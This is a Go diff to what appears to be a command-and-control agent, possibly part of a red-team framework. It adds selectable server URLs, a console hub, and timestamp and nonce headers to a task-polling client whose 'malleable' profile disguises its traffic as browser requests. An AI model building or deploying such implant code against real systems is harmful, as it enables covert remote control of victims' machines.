@@ -18,6 +18,7 @@ import (
 	"log"
 	mrand "math/rand"
 	"net/http"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -124,7 +125,7 @@ func isHttpPollEnabled() bool {
 	return v == "true" || v == "1" || v == "yes"
 }
 
-func runPollClient(cfg config.Config) {
+func runPollClient(cfg config.Config, serverIndex int) {
 	transport, pollProfile, err := createHTTPTransport(cfg)
 	if err != nil {
 		log.Printf("[poll] refusing to start with invalid TLS configuration: %v", err)
@@ -135,7 +136,10 @@ func runPollClient(cfg config.Config) {
 		Timeout:   30 * time.Second,
 	}
 
-	baseURL := wssToPollBase(cfg.ServerURLs[0])
+	if serverIndex < 0 || serverIndex >= len(cfg.ServerURLs) {
+		serverIndex = 0
+	}
+	baseURL := wssToPollBase(cfg.ServerURLs[serverIndex])
 	clientID := cfg.ID
 	token := cfg.AgentToken
 
@@ -149,6 +153,7 @@ func runPollClient(cfg config.Config) {
 		Cancel: cancel,
 	}
 	env.SetServerClientID(clientID)
+	env.Console = rt.NewConsoleHub(env)
 
 	dispatcher := handlers.NewDispatcher(env)
 
@@ -255,6 +260,8 @@ func addMalleableHeaders(req *http.Request, profile malleableProfile) {
 	req.Header.Set("Sec-Fetch-Site", "same-origin")
 	req.Header.Set("Sec-Fetch-Mode", "cors")
 	req.Header.Set("Sec-Fetch-Dest", "empty")
+	req.Header.Set("x-agent-ts", strconv.FormatInt(time.Now().UnixMilli(), 10))
+	req.Header.Set("x-agent-nonce", agentNonce())
 }
 
 func pollFetchTasks(client *http.Client, baseURL, clientID, token string, profile malleableProfile) ([]pollCommand, error) {
